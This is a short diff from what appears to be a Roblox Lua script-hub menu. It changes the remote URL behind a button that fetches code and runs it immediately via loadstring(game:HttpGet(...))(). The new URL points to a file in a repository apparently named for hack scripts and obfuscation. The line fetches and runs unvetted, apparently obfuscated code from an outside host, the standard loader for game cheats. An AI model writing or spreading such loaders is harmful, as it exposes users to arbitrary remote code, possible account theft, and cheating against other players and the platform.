@@ -664,7 +664,7 @@ Games.MouseButton1Down:connect(function()
 	Script1.TextColor3 = Color3.fromRGB(255, 255, 255)
 	Script1.TextSize = 31.000
 	Script1.MouseButton1Down:connect(function()
-		loadstring(game:HttpGet(('https://raw.githubusercontent.com/RinneganDeathX/ChargedHUB-notepad-EDITION-/main/README.md'),true))()
+		loadstring(game:HttpGet(('https://github.com/MainHackScripts/NitroObfuscation-/files/6462490/Lol.txt'),true))()
 	end)
 
 	Script2.Name = "Script2"
